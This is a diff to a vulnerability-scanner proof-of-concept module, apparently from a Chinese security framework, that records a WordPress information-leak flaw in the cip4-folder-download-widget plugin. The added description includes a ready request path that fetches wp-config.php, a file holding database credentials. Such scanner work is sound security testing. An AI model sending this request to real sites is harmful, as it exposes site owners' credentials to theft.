@@ -8,14 +8,16 @@ class Vuln(ABVuln):
     name = 'WordPress 信息泄露'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.INFO_LEAK # 漏洞类型
-    disclosure_date = ''  # 漏洞公布时间
+    disclosure_date = 'Unkonwn'  # 漏洞公布时间
     desc = '''
+        WordPress 信息泄露。
+        /wp-content/plugins/cip4-folder-download-widget/cip4-download.php?target=wp-config.php&info=wp-config.php
     '''  # 漏洞描述
-    ref = ''  # 漏洞来源
-    cnvd_id = ''  # cnvd漏洞编号
-    cve_id = ''  # cve编号
+    ref = 'Unkonwn'  # 漏洞来源
+    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
+    cve_id = 'Unkonwn'  # cve编号
     product = 'WordPress'  # 漏洞应用名称
-    product_version = ''  # 漏洞应用版本
+    product_version = 'WordPress cip4-folder-download-widget'  # 漏洞应用版本
 
 class Poc(ABPoc):
     poc_id = 'aedd2ec2-5e7b-42aa-9d10-d8f392718eb9'
@@ -43,7 +45,7 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        self.verify()
 
 if __name__ == '__main__':
     Poc().run()
